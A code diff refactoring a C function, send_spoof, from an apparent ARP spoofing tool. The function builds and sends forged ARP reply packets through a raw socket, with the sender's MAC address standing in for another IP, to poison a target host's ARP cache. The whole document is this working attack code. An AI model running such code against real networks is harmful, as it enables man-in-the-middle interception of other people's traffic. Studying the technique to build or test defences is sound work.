@@ -7,30 +7,26 @@
 
 #include "arpspoofing.h"
 
-int send_spoof(arp_t *arp, int fd, int ifindex, char *src_mac,
-    uint32_t src_ip, uint32_t dst_ip)
+int send_spoof(arp_t *arp, int fd)
 {
-    unsigned char buffer[BUF_SIZE];
-    ssize_t ret = 0;
-    struct ethhdr *send_req = (struct ethhdr *)buffer;
-    arphdr_t *arp_req = (arphdr_t *)(buffer + ETH2_LEN);
-    struct sockaddr_ll socket_address;
+    struct ethhdr *send_req = (struct ethhdr *)arp->buffer;
+    arphdr_t *arp_req = (arphdr_t *)(arp->buffer + ETH2_LEN);
 
-    socket_address.sll_family = AF_PACKET;
-    socket_address.sll_protocol = htons(ETH_P_ARP);
-    socket_address.sll_ifindex = ifindex;
-    socket_address.sll_hatype = htons(ARPHRD_ETHER);
-    socket_address.sll_pkttype = (PACKET_BROADCAST);
-    socket_address.sll_halen = MAC_LEN;
-    socket_address.sll_addr[6] = 0x00;
-    socket_address.sll_addr[7] = 0x00;
+    arp->socket_address.sll_family = AF_PACKET;
+    arp->socket_address.sll_protocol = htons(ETH_P_ARP);
+    arp->socket_address.sll_ifindex = arp->ifindex;
+    arp->socket_address.sll_hatype = htons(ARPHRD_ETHER);
+    arp->socket_address.sll_pkttype = (PACKET_BROADCAST);
+    arp->socket_address.sll_halen = MAC_LEN;
+    arp->socket_address.sll_addr[6] = 0x00;
+    arp->socket_address.sll_addr[7] = 0x00;
 
-    memset(buffer, 0, sizeof(buffer));
+    memset(arp->buffer, 0, sizeof(arp->buffer));
     memcpy(send_req->h_dest, arp->target_mac, MAC_LEN);
     memcpy(arp_req->dest_mac, arp->target_mac, MAC_LEN);
-    memcpy(send_req->h_source, src_mac, MAC_LEN);
-    memcpy(arp_req->src_mac, src_mac, MAC_LEN);
-    memcpy(socket_address.sll_addr, src_mac, MAC_LEN);
+    memcpy(send_req->h_source, arp->mac, MAC_LEN);
+    memcpy(arp_req->src_mac, arp->mac, MAC_LEN);
+    memcpy(arp->socket_address.sll_addr, arp->mac, MAC_LEN);
 
     send_req->h_proto = htons(ETH_P_ARP);
     arp_req->hardware_type = htons(HW_TYPE);
@@ -39,11 +35,12 @@ int send_spoof(arp_t *arp, int fd, int ifindex, char *src_mac,
     arp_req->protocol_len = IPV4_LEN;
     arp_req->opcode = htons(ARP_REPLY);
 
-    memcpy(arp_req->src_ip, &src_ip, sizeof(uint32_t));
-    memcpy(arp_req->dest_ip, &dst_ip, sizeof(uint32_t));
+    memcpy(arp_req->src_ip, &arp->src, sizeof(uint32_t));
+    memcpy(arp_req->dest_ip, &arp->dst, sizeof(uint32_t));
 
-    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
-    if (ret == -1)
+    arp->ret = sendto(fd, arp->buffer, 42, 0,
+        (struct sockaddr *)&arp->socket_address, sizeof(arp->socket_address));
+    if (arp->ret == -1)
         error("Sendto failed");
 
     printf("Spoofed packet sent to '%s'\n", arp->dest);
